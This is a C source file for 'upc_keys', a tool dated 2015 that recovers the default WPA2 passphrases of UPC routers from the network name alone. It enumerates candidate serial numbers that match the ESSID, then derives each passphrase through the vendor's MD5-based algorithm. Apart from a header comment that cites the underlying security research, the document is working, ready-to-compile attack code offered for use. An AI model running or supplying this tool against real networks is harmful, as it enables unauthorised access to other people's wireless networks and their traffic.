/*
 * upc_keys.c -- WPA2 passphrase recovery tool for UPC%07d devices
 * ===============================================================
 * You'd think vendors would stop using weak algorithms that allow
 * people to recover the credentials for a WiFi network based on
 * purely the ESSID. Sadly, these days aren't over yet. We've seen
 * some excellent recent research by Novella/Meijer/Verdult [1][2]
 * lately which illustrates that these issues still exist in recent
 * devices/firmwares. I set out to dig up one of these algorithms 
 * and came up with this little tool. 
 *
 * The attack is two-fold; in order to generate the single valid
 * WPA2 phrase for a given network we need to know the serialnumber
 * of the device.. which we don't have. Luckily there's a correlation
 * between the ESSID and serial number as well, so we can generate a
 * list of 'candidate' serial numbers (usually around ~20 or so) for 
 * a given ESSID and generate the corresponding WPA2 phrase for each
 * serial. (This should take under a second on a reasonable system)
 *
 * Use at your own risk and responsibility. Do not complain if it
 * fails to recover some keys, there could very well be variations
 * out there I am not aware of. Do not contact me for support.
 * 
 * Cheerz to p00pf1ng3r for the code cleanup! *burp* ;-)
 * Hugs to all old & new friends who managed to make it down to 32c3! ykwya!
 *
 * Happy haxxing in 2016! ;-]
 *
 * Cya,
 * blasty <peter@haxx.in> // 20151231
 *
 * P.S. Reversing eCos and broadcom CFE sux
 * P.P.S. I don't think this is able to recover phrases for 5ghz networks
 * atm but I will look into fixing this soon once I find some time, someone
 * else can feel free to one up me as well. ;-)
 *
 * $ gcc -O2 -o upc_keys upc_keys.c -lcrypto 
 *
 * References
 * [1] https://www.usenix.org/system/files/conference/woot15/woot15-paper-lorente.pdf
 * [2] http://archive.hack.lu/2015/hacklu15_enovella_reversing_routers.pdf
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include "md5.h"

#define MAGIC_24GHZ 0xffd9da60
#define MAGIC_5GHZ 0xff8d8f20
#define MAGIC0 0xb21642c9ll
#define MAGIC1 0x68de3afll
#define MAGIC2 0x6b5fca6bll

#define MAX0 9
#define MAX1 99
#define MAX2 9
#define MAX3 9999

void hash2pass(uint8_t *in_hash, char *out_pass)
{
	uint32_t i, a;

	for (i = 0; i < 8; i++) {
		a = in_hash[i] & 0x1f;
		a -= ((a * MAGIC0) >> 36) * 23;

		a = (a & 0xff) + 0x41;

		if (a >= 'I') a++;
		if (a >= 'L') a++;
		if (a >= 'O') a++;

		out_pass[i] = a;
	}
	out_pass[8] = 0;
}

uint32_t mangle(uint32_t *pp)
{
	uint32_t a, b;

	a = ((pp[3] * MAGIC1) >> 40) - (pp[3] >> 31);
	b = (pp[3] - a * 9999 + 1) * 11ll;

	return b * (pp[1] * 100 + pp[2] * 10 + pp[0]);
}

uint32_t upc_generate_ssid(uint32_t* data, uint32_t magic)
{
	uint32_t a, b, c;

	a = data[1] * 10 + data[2];
	b = data[0] * 2500000 + a * 6800 + data[3] + magic;

	c = b - (((b * MAGIC2) >> 54) - (b >> 31)) * 10000000;
	return c;
}

void banner(void)
{
	printf(
		"\n"
		" ================================================================\n"
		"  upc_keys // WPA2 passphrase recovery tool for UPC%%07d devices \n"
		" ================================================================\n"
		"  by blasty <peter@haxx.in>\n\n"
	);
}

void usage(char *prog)
{
	printf("Usage: %s <ESSID>\n", prog);
}

void upc_keys(uint32_t target){
	uint32_t buf[4];
	char serial[64];
	char pass[9], tmpstr[17];
	uint8_t h1[16], h2[16];
	uint32_t hv[4], w1, w2, i, cnt = 0;

	MD5_CTX ctx;

	int x = 0;
	for (buf[0] = 0; buf[0] <= MAX0; buf[0]++)
		for (buf[1] = 0; buf[1] <= MAX1; buf[1]++)
			for (buf[2] = 0; buf[2] <= MAX2; buf[2]++)
				for (buf[3] = 0; buf[3] <= MAX3; buf[3]++) {
					uint32_t n = upc_generate_ssid(buf, MAGIC_24GHZ);
					uint32_t n1 = upc_generate_ssid(buf, MAGIC_5GHZ);

					if (n != target && n1 != target) {
						continue;
					}

					cnt++;

					sprintf(serial, "SAAP%d%02d%d%04d", buf[0], buf[1], buf[2], buf[3]);

					MD5_Init(&ctx);
					MD5_Update(&ctx, serial, strlen(serial));
					MD5_Final(h1, &ctx);

					for (i = 0; i < 4; i++) {
						hv[i] = *(uint16_t *)(h1 + i * 2);
					}

					w1 = mangle(hv);

					for (i = 0; i < 4; i++) {
						hv[i] = *(uint16_t *)(h1 + 8 + i * 2);
					}

					w2 = mangle(hv);

					sprintf(tmpstr, "%08X%08X", w1, w2);

					MD5_Init(&ctx);
					MD5_Update(&ctx, tmpstr, strlen(tmpstr));
					MD5_Final(h2, &ctx);

					hash2pass(h2, pass);
					printf("  -> WPA2 phrase for '%s' = '%s'\n", serial, pass);
				}


	printf("\n  \x1b[1m=> found %u possible WPA2 phrases, enjoy!\x1b[0m\n\n", cnt);
}

int main(int argc, char *argv[])
{
	uint32_t target;

	banner();

	if(argc != 2) {
		usage(argv[0]);
		return 1;
	}

	target = strtoul(argv[1] + 3, NULL, 0);

	upc_keys(target);

	return 0;
}
